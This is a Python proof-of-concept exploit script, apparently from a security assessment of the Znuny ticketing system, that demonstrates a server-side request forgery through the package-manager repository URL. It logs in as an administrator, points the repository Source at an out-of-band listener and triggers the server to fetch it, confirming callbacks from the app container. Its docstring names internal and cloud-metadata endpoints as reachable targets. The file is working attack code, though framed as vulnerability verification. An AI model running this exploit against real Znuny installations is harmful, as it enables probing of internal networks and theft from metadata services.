#!/usr/bin/env python3
r"""
VULN-028 — SSRF via unguarded WebUserAgent (admin config URLs)
==============================================================
Vulnerable code : targets/Znuny/Kernel/System/WebUserAgent.pm:157,225,237
                  (LWP::UserAgent->get/post($Param{URL}) with no scheme/host/internal-IP allowlist)
                  caller: Kernel/System/Package.pm (online repository fetch: WebUserAgent->get($Source.'/otrs.xml'))
Vulnerability   : CWE-918 Server-Side Request Forgery

Admin-set URLs (package repository, OAuth2 token endpoints, RSS feeds, mail-account hosts) reach
LWP::UserAgent->get/post with no SSRF protection, so the server will fetch attacker-chosen
internal/cloud-metadata endpoints. This exploit points the package-manager repository `Source` at
an out-of-band listener on the docker host gateway and shows the *app container* connecting to it.
"""
import os, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C
HERE = os.path.dirname(os.path.abspath(__file__))

def main():
    C.banner("VULN-028", "SSRF via unguarded WebUserAgent (package repository Source)",
             ["WebUserAgent.pm:225 get($Param{URL}) — no internal-IP/scheme/host allowlist"])
    a = C.agent_client(C.ADMIN_USER, C.ADMIN_PASS)
    tok, _ = a.refresh_token(C.AGENT_URL + "?Action=AdminPackageManager")

    with C.OOB() as oob:
        src = f"{oob.url}/repo"     # attacker-controlled URL reachable from inside the container
        C.log("SETUP", f"OOB listener at {oob.url}; setting package repository Source={src}")
        # ChangeRepository stores Source in the admin's prefs; viewing then fetches Source/otrs.xml
        a.post(data={"Action": "AdminPackageManager", "Subaction": "ChangeRepository",
                     "Source": src, "ChallengeToken": tok})
        C.log("STEP", "GET AdminPackageManager with the attacker Source -> server fetches Source/otrs.xml")
        a.get({"Action": "AdminPackageManager", "Source": src})
        # some builds fetch on the online-list subaction; try it too
        a.get({"Action": "AdminPackageManager", "Subaction": "View", "Source": src})
        hit = oob.wait_hit(15)
        C.log("PROOF", f"OOB listener received {len(oob.hits)} request(s): "
                       f"{[(h['cmd'], h['path'], h['client']) for h in oob.hits][:3]}")

        open(os.path.join(HERE, "request.http"), "w").write(
            "POST /znuny/index.pl  Action=AdminPackageManager;Subaction=ChangeRepository;"
            f"Source={src};ChallengeToken=<admin>\n"
            "GET  /znuny/index.pl?Action=AdminPackageManager;Source=<attacker OOB URL>\n")
        open(os.path.join(HERE, "response.txt"), "w").write(
            "OOB hits:\n" + "\n".join(f"{h['cmd']} {h['path']} from {h['client']}" for h in oob.hits))

        if hit:
            client_is_app = any(h["client"].startswith("172.") for h in oob.hits)
            C.confirmed(f"the Znuny server fetched the attacker-controlled URL {src}/... : the OOB "
                        f"listener logged {len(oob.hits)} inbound request(s) from the app container "
                        f"({[h['client'] for h in oob.hits][:1]}) — WebUserAgent performs no SSRF "
                        "filtering, so an admin-set URL drives server-side requests to arbitrary hosts.")
        else:
            C.failed("no OOB callback received within 15s (WebUserAgent may not have been triggered "
                     "on this build/path)")

if __name__ == "__main__":
    main()
